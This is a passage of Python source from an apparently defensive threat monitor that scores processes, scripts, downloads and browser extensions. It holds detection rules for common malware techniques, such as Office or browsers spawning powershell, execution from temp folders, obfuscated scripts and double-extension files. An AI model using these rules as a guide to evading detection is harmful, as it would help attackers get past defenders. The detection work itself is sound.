            )

        if "network" in components:
            snapshot.network_connections = await asyncio.to_thread(
                self._collect_local_connections
            )

        # Scripts, downloads, browser extensions, and DNS history are not
        # collected by the fallback because doing so requires product-specific
        # filesystem/browser permissions and trusted adapters.

        return snapshot

    def _collect_local_processes(self) -> List[Dict[str, Any]]:
        """Collect read-only process telemetry using psutil."""
        if psutil is None:
            return []

        process_records: List[Dict[str, Any]] = []
        attributes = [
            "pid",
            "ppid",
            "name",
            "exe",
            "status",
            "create_time",
            "cpu_percent",
            "memory_percent",
        ]

        if self.monitor_config.allow_command_line_collection:
            attributes.append("cmdline")

        if self.monitor_config.allow_username_collection:
            attributes.append("username")

        for process in psutil.process_iter(attrs=attributes):
            if len(process_records) >= self.monitor_config.max_process_count:
                break

            try:
                info = dict(process.info)
                cmdline = info.get("cmdline")

                if isinstance(cmdline, (list, tuple)):
                    info["command_line"] = " ".join(
                        _normalize_text(item) for item in cmdline
                    )
                elif cmdline is not None:
                    info["command_line"] = _normalize_text(cmdline)

                info.pop("cmdline", None)
                process_records.append(_json_safe(info))
            except (
                psutil.NoSuchProcess,
                psutil.AccessDenied,
                psutil.ZombieProcess,
            ):
                continue
            except Exception:
                continue

        return process_records

    def _collect_local_connections(self) -> List[Dict[str, Any]]:
        """Collect read-only network connections using psutil."""
        if psutil is None:
            return []

        records: List[Dict[str, Any]] = []

        try:
            connections = psutil.net_connections(kind="inet")
        except Exception:
            return []

        for connection in connections[
            : self.monitor_config.max_connection_count
        ]:
            try:
                local_ip = ""
                local_port = None
                remote_ip = ""
                remote_port = None

                if connection.laddr:
                    local_ip = getattr(
                        connection.laddr,
                        "ip",
                        connection.laddr[0] if connection.laddr else "",
                    )
                    local_port = getattr(
                        connection.laddr,
                        "port",
                        connection.laddr[1]
                        if len(connection.laddr) > 1
                        else None,
                    )

                if connection.raddr:
                    remote_ip = getattr(
                        connection.raddr,
                        "ip",
                        connection.raddr[0] if connection.raddr else "",
                    )
                    remote_port = getattr(
                        connection.raddr,
                        "port",
                        connection.raddr[1]
                        if len(connection.raddr) > 1
                        else None,
                    )

                records.append(
                    {
                        "pid": connection.pid,
                        "family": str(connection.family),
                        "type": str(connection.type),
                        "status": connection.status,
                        "local_address": local_ip,
                        "local_port": local_port,
                        "remote_address": remote_ip,
                        "remote_port": remote_port,
                        "observed_at": _utc_now().isoformat(),
                    }
                )
            except Exception:
                continue

        return records

    # =========================================================================
    # Process analysis
    # =========================================================================

    def _analyze_process(
        self,
        process: Mapping[str, Any],
        parent_map: Mapping[int, Mapping[str, Any]],
        user_id: str,
        workspace_id: str,
    ) -> List[ThreatFinding]:
        """Analyze one process record."""
        findings: List[ThreatFinding] = []

        pid = _coerce_int(process.get("pid"), -1)
        ppid = _coerce_int(process.get("ppid"), -1)
        name = _normalize_text(
            process.get("name")
            or process.get("process_name")
            or _safe_basename(process.get("exe"))
        )
        name_lower = name.lower()
        executable = _normalize_text(
            process.get("exe")
            or process.get("path")
            or process.get("executable")
        )
        executable_lower = executable.lower()
        command_line = _normalize_text(
            process.get("command_line")
            or process.get("cmdline")
            or process.get("command")
        )
        command_lower = command_line.lower()

        process_allowlist = {
            item.lower() for item in self.monitor_config.process_allowlist
        }
        path_allowlist = {
            item.lower() for item in self.monitor_config.process_path_allowlist
        }

        if name_lower in process_allowlist:
            return findings

        if executable_lower and executable_lower in path_allowlist:
            return findings

        suspicious_names = {
            item.lower()
            for item in (
                self.monitor_config.suspicious_process_names
                | self.monitor_config.process_name_denylist
            )
        }

        if name_lower in suspicious_names:
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.PROCESS,
                    risk_score=88,
                    title="Known high-risk process name detected",
                    description=(
                        "A running process name matches a configured "
                        "high-risk process indicator."
                    ),
                    source_type="process",
                    source_id=str(pid),
                    rule_id="PROC_KNOWN_HIGH_RISK_NAME",
                    indicators=[f"process_name:{name_lower}"],
                    evidence=self._evidence(
                        {
                            "pid": pid,
                            "name": name,
                            "executable": executable,
                        }
                    ),
                    recommendations=[
                        "Route the finding to Security Agent for review.",
                        "Verify the executable signature, source, owner, and hash.",
                        "Do not terminate the process without approval.",
                    ],
                    process_id=pid if pid >= 0 else None,
                    process_name=name or None,
                    file_path=executable or None,
                )
            )

        command_matches = _match_patterns(
            command_lower,
            self._command_patterns,
        )

        if command_matches:
            score = min(98, 60 + (len(command_matches) * 8))

            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.SCRIPT,
                    risk_score=score,
                    title="Suspicious process command line detected",
                    description=(
                        "The process command line matched one or more "
                        "high-risk execution or download patterns."
                    ),
                    source_type="process",
                    source_id=str(pid),
                    rule_id="PROC_SUSPICIOUS_COMMAND_LINE",
                    indicators=[
                        f"command_pattern:{pattern}"
                        for pattern in command_matches
                    ],
                    evidence=self._evidence(
                        {
                            "pid": pid,
                            "name": name,
                            "executable": executable,
                            "command_line": self._redact_command_line(
                                command_line
                            ),
                        }
                    ),
                    recommendations=[
                        "Verify whether the command was authorized.",
                        "Inspect related parent and child processes.",
                        "Submit the executable or script hash for verification.",
                        "Use Security Agent approval before containment.",
                    ],
                    process_id=pid if pid >= 0 else None,
                    process_name=name or None,
                    file_path=executable or None,
                )
            )

        if executable:
            suspicious_locations = self._suspicious_process_locations(
                executable
            )

            if suspicious_locations:
                score = 52 + min(25, len(suspicious_locations) * 7)

                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.PROCESS,
                        risk_score=score,
                        title="Process running from a high-risk location",
                        description=(
                            "A process executable is running from a temporary, "
                            "user-writable, or commonly abused location."
                        ),
                        source_type="process",
                        source_id=str(pid),
                        rule_id="PROC_HIGH_RISK_EXECUTION_PATH",
                        indicators=suspicious_locations,
                        evidence=self._evidence(
                            {
                                "pid": pid,
                                "name": name,
                                "executable": executable,
                            }
                        ),
                        recommendations=[
                            "Confirm whether the path is expected for this application.",
                            "Verify file hash, signature, creation time, and owner.",
                            "Review the process parent and network activity.",
                        ],
                        process_id=pid if pid >= 0 else None,
                        process_name=name or None,
                        file_path=executable,
                    )
                )

        if name and _looks_random_name(name):
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.PROCESS,
                    risk_score=35,
                    title="Process has an algorithmic-looking name",
                    description=(
                        "The process name appears randomly generated. "
                        "This is a weak heuristic and requires review."
                    ),
                    source_type="process",
                    source_id=str(pid),
                    rule_id="PROC_RANDOMIZED_NAME",
                    indicators=["algorithmic_looking_process_name"],
                    evidence=self._evidence(
                        {
                            "pid": pid,
                            "name": name,
                            "executable": executable,
                        }
                    ),
                    recommendations=[
                        "Verify the executable publisher and application origin.",
                        "Correlate with process path, parent, hash, and network activity.",
                    ],
                    process_id=pid if pid >= 0 else None,
                    process_name=name,
                    file_path=executable or None,
                )
            )

        cpu_percent = _coerce_float(
            process.get("cpu_percent")
            or process.get("cpu"),
            0.0,
        )
        memory_percent = _coerce_float(
            process.get("memory_percent")
            or process.get("memory"),
            0.0,
        )

        if (
            cpu_percent >= self.monitor_config.process_cpu_threshold
            and memory_percent >= self.monitor_config.process_memory_threshold
        ):
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.RESOURCE_ABUSE,
                    risk_score=48,
                    title="Process shows sustained high resource usage",
                    description=(
                        "A process exceeded configured CPU and memory "
                        "thresholds. This may indicate resource abuse, a miner, "
                        "or a legitimate heavy workload."
                    ),
                    source_type="process",
                    source_id=str(pid),
                    rule_id="PROC_HIGH_RESOURCE_USAGE",
                    indicators=[
                        f"cpu_percent:{round(cpu_percent, 2)}",
                        f"memory_percent:{round(memory_percent, 2)}",
                    ],
                    evidence=self._evidence(
                        {
                            "pid": pid,
                            "name": name,
                            "cpu_percent": cpu_percent,
                            "memory_percent": memory_percent,
                        }
                    ),
                    recommendations=[
                        "Confirm whether the workload is expected.",
                        "Review process duration, executable hash, and connections.",
                    ],
                    process_id=pid if pid >= 0 else None,
                    process_name=name or None,
                )
            )

        parent = parent_map.get(ppid)
        if parent:
            parent_name = _normalize_lower(
                parent.get("name")
                or parent.get("process_name")
            )
            unusual_parent_reason = self._detect_unusual_parent_child(
                parent_name=parent_name,
                child_name=name_lower,
            )

            if unusual_parent_reason:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.PROCESS,
                        risk_score=58,
                        title="Unusual parent-child process relationship",
                        description=(
                            "The observed parent-child process relationship "
                            "matches a commonly abused execution pattern."
                        ),
                        source_type="process",
                        source_id=str(pid),
                        rule_id="PROC_UNUSUAL_PARENT_CHILD",
                        indicators=[unusual_parent_reason],
                        evidence=self._evidence(
                            {
                                "pid": pid,
                                "process_name": name,
                                "ppid": ppid,
                                "parent_name": parent_name,
                            }
                        ),
                        recommendations=[
                            "Review the process tree and originating document or browser event.",
                            "Verify whether the child process was expected.",
                        ],
                        process_id=pid if pid >= 0 else None,
                        process_name=name or None,
                    )
                )

        unsigned = process.get("signed") is False
        signature_status = _normalize_lower(
            process.get("signature_status")
        )

        if unsigned or signature_status in {
            "unsigned",
            "invalid",
            "untrusted",
            "revoked",
        }:
            if executable and self._path_looks_system_like(executable):
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DEFENSE_EVASION,
                        risk_score=72,
                        title="Unsigned executable in a system-like path",
                        description=(
                            "An unsigned or untrusted executable was observed "
                            "in a path that resembles a trusted system location."
                        ),
                        source_type="process",
                        source_id=str(pid),
                        rule_id="PROC_UNSIGNED_SYSTEM_PATH",
                        indicators=[
                            f"signature_status:{signature_status or 'unsigned'}"
                        ],
                        evidence=self._evidence(
                            {
                                "pid": pid,
                                "name": name,
                                "executable": executable,
                                "signature_status": (
                                    signature_status or "unsigned"
                                ),
                            }
                        ),
                        recommendations=[
                            "Verify the file signature and publisher.",
                            "Compare file hash with trusted software inventory.",
                            "Escalate to Security Agent before containment.",
                        ],
                        process_id=pid if pid >= 0 else None,
                        process_name=name or None,
                        file_path=executable,
                    )
                )

        return findings

    def _suspicious_process_locations(self, executable: str) -> List[str]:
        """Return suspicious path-location indicators."""
        normalized = executable.replace("\\", "/").lower()
        indicators: List[str] = []

        path_markers = {
            "/tmp/": "execution_from_tmp",
            "/var/tmp/": "execution_from_var_tmp",
            "/dev/shm/": "execution_from_dev_shm",
            "/downloads/": "execution_from_downloads",
            "/download/": "execution_from_downloads",
            "/appdata/local/temp/": "execution_from_user_temp",
            "/appdata/roaming/": "execution_from_roaming_profile",
            "/users/public/": "execution_from_public_user_path",
            "/programdata/": "execution_from_programdata",
            "/recycle.bin/": "execution_from_recycle_bin",
        }

        for marker, indicator in path_markers.items():
            if marker in normalized:
                indicators.append(indicator)

        if normalized.startswith(("./", "../")):
            indicators.append("relative_executable_path")

        if executable.startswith("\\\\"):
            indicators.append("execution_from_network_share")

        return indicators

    @staticmethod
    def _detect_unusual_parent_child(
        parent_name: str,
        child_name: str,
    ) -> Optional[str]:
        """Detect selected suspicious parent-child patterns."""
        relationships = {
            ("winword.exe", "powershell.exe"): "office_spawned_powershell",
            ("winword.exe", "cmd.exe"): "office_spawned_cmd",
            ("excel.exe", "powershell.exe"): "office_spawned_powershell",
            ("excel.exe", "cmd.exe"): "office_spawned_cmd",
            ("powerpnt.exe", "powershell.exe"): "office_spawned_powershell",
            ("powerpnt.exe", "cmd.exe"): "office_spawned_cmd",
            ("outlook.exe", "powershell.exe"): "outlook_spawned_powershell",
            ("outlook.exe", "cmd.exe"): "outlook_spawned_cmd",
            ("chrome.exe", "powershell.exe"): "browser_spawned_powershell",
            ("msedge.exe", "powershell.exe"): "browser_spawned_powershell",
            ("firefox.exe", "powershell.exe"): "browser_spawned_powershell",
            ("wscript.exe", "powershell.exe"): "script_host_spawned_powershell",
            ("cscript.exe", "powershell.exe"): "script_host_spawned_powershell",
            ("mshta.exe", "powershell.exe"): "mshta_spawned_powershell",
        }

        return relationships.get((parent_name, child_name))

    @staticmethod
    def _path_looks_system_like(path: str) -> bool:
        """Return True for common system/application installation paths."""
        normalized = path.replace("\\", "/").lower()

        return any(
            marker in normalized
            for marker in (
                "/windows/system32/",
                "/windows/syswow64/",
                "/program files/",
                "/program files (x86)/",
                "/usr/bin/",
                "/usr/sbin/",
                "/bin/",
                "/sbin/",
                "/system/library/",
                "/applications/",
            )
        )

    # =========================================================================
    # Script analysis
    # =========================================================================

    def _analyze_script(
        self,
        script: Mapping[str, Any],
        user_id: str,
        workspace_id: str,
    ) -> List[ThreatFinding]:
        """Analyze one script record."""
        findings: List[ThreatFinding] = []

        script_id = _normalize_text(
            script.get("script_id")
            or script.get("id")
            or script.get("path")
            or uuid.uuid4().hex
        )
        path = _normalize_text(script.get("path") or script.get("file_path"))
        name = _normalize_text(
            script.get("name")
            or _safe_basename(path)
        )
        content = _normalize_text(
            script.get("content")
            or script.get("text")
            or script.get("source")
        )
        command = _normalize_text(
            script.get("command")
            or script.get("command_line")
        )
        sha256 = _normalize_lower(
            script.get("sha256")
            or script.get("hash")
        )

        if sha256 and sha256 in {
            item.lower()
            for item in self.monitor_config.script_hash_allowlist
        }:
            return findings

        extension = _extract_extension(path or name)

        combined = "\n".join(
            value
            for value in (content, command)
            if value
        )

        matches = _match_patterns(
            combined.lower(),
            self._script_patterns,
        )

        if matches:
            score = min(98, 55 + len(matches) * 7)

            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.SCRIPT,
                    risk_score=score,
                    title="Suspicious script behavior detected",
                    description=(
                        "Script content or command metadata matched one or "
                        "more high-risk execution, download, persistence, "
                        "obfuscation, or network patterns."
                    ),
                    source_type="script",
                    source_id=script_id,
                    rule_id="SCRIPT_SUSPICIOUS_CONTENT",
                    indicators=[
                        f"script_pattern:{pattern}"
                        for pattern in matches
                    ],
                    evidence=self._evidence(
                        {
                            "script_id": script_id,
                            "name": name,
                            "path": path,
                            "extension": extension,
                            "sha256": sha256,
                            "content_hash": (
                                _stable_hash(content)
                                if content
                                else None
                            ),
                        }
                    ),
                    recommendations=[
                        "Review the script source and execution origin.",
                        "Verify the script hash and signer.",
                        "Do not execute or delete the script without approval.",
                        "Correlate with process and network telemetry.",
                    ],
                    file_path=path or None,
                )
            )

        encoded_indicators = self._detect_script_obfuscation(content)

        if encoded_indicators:
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.DEFENSE_EVASION,
                    risk_score=68,
                    title="Script contains possible obfuscation",
                    description=(
                        "The script contains characteristics associated with "
                        "encoded, compressed, or heavily obfuscated content."
                    ),
                    source_type="script",
                    source_id=script_id,
                    rule_id="SCRIPT_OBFUSCATION",
                    indicators=encoded_indicators,
                    evidence=self._evidence(
                        {
                            "script_id": script_id,
                            "name": name,
                            "path": path,
                            "content_length": len(content),
                            "content_hash": (
                                _stable_hash(content)
                                if content
                                else None
                            ),
                        }
                    ),
                    recommendations=[
                        "Decode and inspect the script in an isolated analysis environment.",
                        "Verify whether obfuscation is expected for this software.",
                    ],
                    file_path=path or None,
                )
            )

        if path:
            location_indicators = self._suspicious_script_locations(path)

            if location_indicators:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.SCRIPT,
                        risk_score=45,
                        title="Script stored in a high-risk execution location",
                        description=(
                            "The script is located in a temporary or commonly "
                            "abused writable directory."
                        ),
                        source_type="script",
                        source_id=script_id,
                        rule_id="SCRIPT_HIGH_RISK_LOCATION",
                        indicators=location_indicators,
                        evidence=self._evidence(
                            {
                                "script_id": script_id,
                                "name": name,
                                "path": path,
                                "extension": extension,
                            }
                        ),
                        recommendations=[
                            "Confirm the script origin and intended owner.",
                            "Review related process and download events.",
                        ],
                        file_path=path,
                    )
                )

        if extension and extension not in SCRIPT_EXTENSIONS:
            if content and any(
                marker in content.lower()
                for marker in (
                    "powershell",
                    "#!/bin/bash",
                    "#!/usr/bin/env python",
                    "wscript.shell",
                    "subprocess",
                )
            ):
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DEFENSE_EVASION,
                        risk_score=62,
                        title="Script content uses a misleading file extension",
                        description=(
                            "The file content appears script-like, but its "
                            "extension does not match a recognized script type."
                        ),
                        source_type="script",
                        source_id=script_id,
                        rule_id="SCRIPT_EXTENSION_MISMATCH",
                        indicators=[
                            f"extension:{extension or 'none'}",
                            "script_content_extension_mismatch",
                        ],
                        evidence=self._evidence(
                            {
                                "script_id": script_id,
                                "name": name,
                                "path": path,
                                "extension": extension,
                            }
                        ),
                        recommendations=[
                            "Verify the actual file type and origin.",
                            "Inspect the file in a safe analysis environment.",
                        ],
                        file_path=path or None,
                    )
                )

        return findings

    @staticmethod
    def _detect_script_obfuscation(content: str) -> List[str]:
        """Detect lightweight indicators of script obfuscation."""
        if not content:
            return []

        indicators: List[str] = []
        compact = re.sub(r"\s+", "", content)

        long_base64_blocks = re.findall(
            r"(?:[A-Za-z0-9+/]{80,}={0,2})",
            compact,
        )
        if long_base64_blocks:
            indicators.append("long_base64_like_block")

        if len(content) > 500:
            symbol_count = sum(
                not character.isalnum() and not character.isspace()
                for character in content
            )
            symbol_ratio = symbol_count / max(len(content), 1)

            if symbol_ratio >= 0.30:
                indicators.append("high_symbol_ratio")

        long_lines = [
            line
            for line in content.splitlines()
            if len(line) >= 1_000
        ]
        if long_lines:
            indicators.append("very_long_script_line")

        if content.count("`") >= 20:
            indicators.append("heavy_backtick_usage")

        if len(re.findall(r"\\x[0-9a-fA-F]{2}", content)) >= 20:
            indicators.append("hex_escape_sequence_density")

        if len(re.findall(r"chr\s*\(", content, re.IGNORECASE)) >= 10:
            indicators.append("repeated_character_construction")

        return indicators

    @staticmethod
    def _suspicious_script_locations(path: str) -> List[str]:
        """Detect risky script locations."""
        normalized = path.replace("\\", "/").lower()
        indicators: List[str] = []

        markers = {
            "/tmp/": "script_in_tmp",
            "/var/tmp/": "script_in_var_tmp",
            "/dev/shm/": "script_in_dev_shm",
            "/appdata/local/temp/": "script_in_user_temp",
            "/downloads/": "script_in_downloads",
            "/users/public/": "script_in_public_directory",
            "/recycle.bin/": "script_in_recycle_bin",
        }

        for marker, indicator in markers.items():
            if marker in normalized:
                indicators.append(indicator)

        return indicators

    # =========================================================================
    # Download analysis
    # =========================================================================

    def _analyze_download(
        self,
        download: Mapping[str, Any],
        user_id: str,
        workspace_id: str,
    ) -> List[ThreatFinding]:
        """Analyze one download record."""
        findings: List[ThreatFinding] = []

        download_id = _normalize_text(
            download.get("download_id")
            or download.get("id")
            or uuid.uuid4().hex
        )
        filename = _normalize_text(
            download.get("filename")
            or download.get("name")
            or _safe_basename(download.get("path"))
        )
        path = _normalize_text(
            download.get("path")
            or download.get("file_path")
        )
        source_url = _normalize_text(
            download.get("url")
            or download.get("source_url")
            or download.get("referrer")
        )
        source_domain = _extract_host(
            download.get("domain")
            or source_url
        )
        sha256 = _normalize_lower(
            download.get("sha256")
            or download.get("hash")
        )
        mime_type = _normalize_lower(
            download.get("mime_type")
            or download.get("content_type")
        )
        extension = _extract_extension(filename or path)
        signed = download.get("signed")
        signature_status = _normalize_lower(
            download.get("signature_status")
        )
        reputation = _normalize_lower(
            download.get("reputation")
            or download.get("reputation_status")
        )

        if sha256 and sha256 in {
            item.lower()
            for item in self.monitor_config.download_hash_allowlist
        }:
            return findings

        name_matches = _match_patterns(
            filename,
            self._download_name_patterns,
        )

        if name_matches:
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.DOWNLOAD,
                    risk_score=62,
                    title="Suspicious download filename detected",
                    description=(
                        "The downloaded filename matched a configured "
                        "high-risk naming indicator."
                    ),
                    source_type="download",
                    source_id=download_id,
                    rule_id="DOWNLOAD_SUSPICIOUS_FILENAME",
                    indicators=[
                        f"filename_pattern:{pattern}"
                        for pattern in name_matches
                    ],
                    evidence=self._evidence(
                        {
                            "download_id": download_id,
                            "filename": filename,
                            "path": path,
                            "extension": extension,
                            "sha256": sha256,
                            "source_domain": self._redact_domain(
                                source_domain
                            ),
                        }
                    ),
                    recommendations=[
                        "Verify the file source, signature, and hash.",
                        "Do not open or execute the download before review.",
                        "Route containment actions through Security Agent.",
                    ],
                    file_path=path or None,
                )
            )

        if extension in EXECUTABLE_EXTENSIONS | SCRIPT_EXTENSIONS:
            score = 45

            if signed is False or signature_status in {
                "unsigned",
                "invalid",
                "untrusted",
                "revoked",
            }:
                score += 25

            if reputation in {
                "malicious",
                "suspicious",
                "unknown",
                "untrusted",
            }:
                score += 15

            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.DOWNLOAD,
                    risk_score=min(score, 95),
                    title="Executable or script download requires review",
                    description=(
                        "A downloaded file can execute code or scripts. "
                        "Its source and trust metadata should be verified."
                    ),
                    source_type="download",
                    source_id=download_id,
                    rule_id="DOWNLOAD_EXECUTABLE_OR_SCRIPT",
                    indicators=[
                        f"extension:{extension}",
                        f"signature_status:{signature_status or signed}",
                        f"reputation:{reputation or 'not_provided'}",
                    ],
                    evidence=self._evidence(
                        {
                            "download_id": download_id,
                            "filename": filename,
                            "path": path,
                            "extension": extension,
                            "mime_type": mime_type,
                            "sha256": sha256,
                            "source_domain": self._redact_domain(
                                source_domain
                            ),
                        }
                    ),
                    recommendations=[
                        "Verify the publisher signature and file hash.",
                        "Confirm the user intentionally downloaded the file.",
                        "Use isolated analysis before execution when trust is uncertain.",
                    ],
                    file_path=path or None,
                )
            )

        if extension in DOCUMENT_EXTENSIONS:
            macro_enabled = _coerce_bool(
                download.get("macro_enabled"),
                False,
            )

            if extension in {".docm", ".xlsm", ".pptm"} or macro_enabled:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DOWNLOAD,
                        risk_score=58,
                        title="Macro-capable document downloaded",
                        description=(
                            "The downloaded document supports active macro "
                            "content and should be reviewed before opening."
                        ),
                        source_type="download",
                        source_id=download_id,
                        rule_id="DOWNLOAD_MACRO_DOCUMENT",
                        indicators=[
                            f"extension:{extension}",
                            "macro_capable_document",
                        ],
                        evidence=self._evidence(
                            {
                                "download_id": download_id,
                                "filename": filename,
                                "path": path,
                                "sha256": sha256,
                                "source_domain": self._redact_domain(
                                    source_domain
                                ),
                            }
                        ),
                        recommendations=[
                            "Open the document only in protected view.",
                            "Disable macros unless the source is trusted.",
                            "Verify the sender and download origin.",
                        ],
                        file_path=path or None,
                    )
                )

        if filename and self._has_double_extension(filename):
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.DEFENSE_EVASION,
                    risk_score=72,
                    title="Download uses a misleading double extension",
                    description=(
                        "The filename appears to hide an executable or script "
                        "extension behind a document or media extension."
                    ),
                    source_type="download",
                    source_id=download_id,
                    rule_id="DOWNLOAD_DOUBLE_EXTENSION",
                    indicators=["misleading_double_extension"],
                    evidence=self._evidence(
                        {
                            "download_id": download_id,
                            "filename": filename,
                            "path": path,
                            "extension": extension,
                        }
                    ),
                    recommendations=[
                        "Do not open the file until its real type is verified.",
                        "Inspect the file signature and hash.",
                    ],
                    file_path=path or None,
                )
            )

        if source_domain:
            normalized_domain = source_domain.lower()

            if self._domain_is_denied(normalized_domain):
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DOWNLOAD,
                        risk_score=95,
                        title="Download originated from a denied domain",
                        description=(
                            "The download source matches the configured "
                            "domain denylist."
                        ),
                        source_type="download",
                        source_id=download_id,
                        rule_id="DOWNLOAD_DENIED_DOMAIN",
                        indicators=[
                            f"denied_domain:{self._redact_domain(normalized_domain)}"
                        ],
                        evidence=self._evidence(
                            {
                                "download_id": download_id,
                                "filename": filename,
                                "source_domain": self._redact_domain(
                                    normalized_domain
                                ),
                                "sha256": sha256,
                            }
                        ),
                        recommendations=[
                            "Prevent execution or opening until reviewed.",
                            "Escalate the source to Security Agent.",
                        ],
                        file_path=path or None,
                    )
                )
            elif not self._domain_is_allowed(normalized_domain):
                risky, domain_indicators = _is_high_risk_domain(
                    normalized_domain,
                    self.monitor_config.high_risk_tlds,
                    self.monitor_config.dynamic_dns_suffixes,
                )

                if risky:
                    findings.append(
                        self._create_finding(
                            user_id=user_id,
                            workspace_id=workspace_id,
                            category=ThreatCategory.DOWNLOAD,
                            risk_score=50,
                            title="Download originated from a higher-risk domain",
                            description=(
                                "The source domain matched one or more "
                                "lightweight domain-risk indicators."
                            ),
                            source_type="download",
                            source_id=download_id,
                            rule_id="DOWNLOAD_RISKY_SOURCE_DOMAIN",
                            indicators=domain_indicators,
                            evidence=self._evidence(
                                {
                                    "download_id": download_id,
                                    "filename": filename,
                                    "source_domain": self._redact_domain(
                                        normalized_domain
                                    ),
                                }
                            ),
                            recommendations=[
                                "Verify the source domain and file reputation.",
                                "Correlate with browser and DNS events.",
                            ],
                            file_path=path or None,
                        )
                    )

        detected_type = _normalize_lower(
            download.get("detected_file_type")
            or download.get("magic_type")
        )

        if detected_type and extension:
            if self._mime_extension_mismatch(
                extension=extension,
                mime_type=mime_type,
                detected_type=detected_type,
            ):
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DEFENSE_EVASION,
                        risk_score=67,
                        title="Downloaded file type does not match its extension",
                        description=(
                            "The detected file type conflicts with the visible "
                            "file extension or declared MIME type."
                        ),
                        source_type="download",
                        source_id=download_id,
                        rule_id="DOWNLOAD_TYPE_MISMATCH",
                        indicators=[
                            f"extension:{extension}",
                            f"mime_type:{mime_type}",
                            f"detected_type:{detected_type}",
                        ],
                        evidence=self._evidence(
                            {
                                "download_id": download_id,
                                "filename": filename,
                                "extension": extension,
                                "mime_type": mime_type,
                                "detected_type": detected_type,
                            }
                        ),
                        recommendations=[
                            "Do not open the file before verifying its actual format.",
                            "Inspect the file in an isolated environment.",
                        ],
                        file_path=path or None,
                    )
                )

        return findings

    @staticmethod
    def _has_double_extension(filename: str) -> bool:
        """Detect selected misleading double-extension filenames."""
        lower = filename.lower()
        parts = lower.split(".")

        if len(parts) < 3:
            return False

        final_extension = f".{parts[-1]}"
        previous_extension = f".{parts[-2]}"

        executable_like = EXECUTABLE_EXTENSIONS | SCRIPT_EXTENSIONS
        benign_looking = DOCUMENT_EXTENSIONS | {
            ".jpg",
            ".jpeg",
            ".png",
            ".gif",
            ".txt",
            ".csv",
            ".mp3",
            ".mp4",
        }

        return (
            final_extension in executable_like
            and previous_extension in benign_looking
        )

    @staticmethod
    def _mime_extension_mismatch(
        extension: str,
        mime_type: str,
        detected_type: str,
    ) -> bool:
        """Detect obvious file-type mismatches."""
        executable_markers = {
            "executable",
            "pe32",
            "mach-o",
            "elf",
            "application/x-dosexec",
            "application/x-executable",
        }

        combined_type = f"{mime_type} {detected_type}".lower()

        if extension in {
            ".jpg",
            ".jpeg",
            ".png",
            ".gif",
            ".pdf",
            ".txt",
            ".docx",
            ".xlsx",
        }:
            return any(
                marker in combined_type
                for marker in executable_markers
            )

        return False

    # =========================================================================
    # Browser extension analysis
    # =========================================================================

    def _analyze_browser_extension(
        self,
        extension: Mapping[str, Any],
        user_id: str,
        workspace_id: str,
    ) -> List[ThreatFinding]:
        """Analyze one browser extension record."""
        findings: List[ThreatFinding] = []

        extension_id = _normalize_text(
            extension.get("extension_id")
            or extension.get("id")
        )
        name = _normalize_text(extension.get("name"))
        version = _normalize_text(extension.get("version"))
        browser = _normalize_text(extension.get("browser"))
        update_url = _normalize_text(
            extension.get("update_url")
            or extension.get("source_url")
        )
        install_source = _normalize_lower(
            extension.get("install_source")
            or extension.get("source")
        )

        permissions = {
            _normalize_text(permission)
            for permission in (
                list(extension.get("permissions") or [])
                + list(extension.get("host_permissions") or [])
                + list(extension.get("optional_permissions") or [])
            )
            if _normalize_text(permission)
        }

        normalized_extension_allowlist = {
            item.lower()
            for item in self.monitor_config.extension_id_allowlist
        }
        normalized_extension_denylist = {
            item.lower()
            for item in self.monitor_config.extension_id_denylist
        }

        if extension_id.lower() in normalized_extension_allowlist:
            return findings

        if extension_id.lower() in normalized_extension_denylist:
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.BROWSER_EXTENSION,
                    risk_score=98,
                    title="Denied browser extension detected",
                    description=(
                        "The extension ID matches the configured extension "
                        "denylist."
                    ),
                    source_type="browser_extension",
                    source_id=extension_id,
                    rule_id="EXTENSION_DENYLIST_MATCH",
                    indicators=[
                        f"extension_id:{extension_id}"
                    ],
                    evidence=self._evidence(
                        {
                            "extension_id": extension_id,
                            "name": name,
                            "version": version,
                            "browser": browser,
                        }
                    ),
                    recommendations=[
                        "Route extension disablement or removal through Security Agent.",
                        "Review the extension source and affected browser profile.",
                    ],
                    extension_id=extension_id,
                )
            )

        risky_permissions = sorted(
            permission
            for permission in permissions
            if permission
            in self.monitor_config.suspicious_extension_permissions
        )

        if risky_permissions:
            permission_score = min(
                86,
                30 + len(risky_permissions) * 8,
            )

            if len(risky_permissions) >= (
                self.monitor_config.extension_permission_threshold
            ):
                permission_score = max(permission_score, 70)

            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.BROWSER_EXTENSION,
                    risk_score=permission_score,
                    title="Browser extension has high-impact permissions",
                    description=(
                        "The extension requests permissions that can access "
                        "browsing data, downloads, traffic, proxy settings, "
                        "native applications, or all websites."
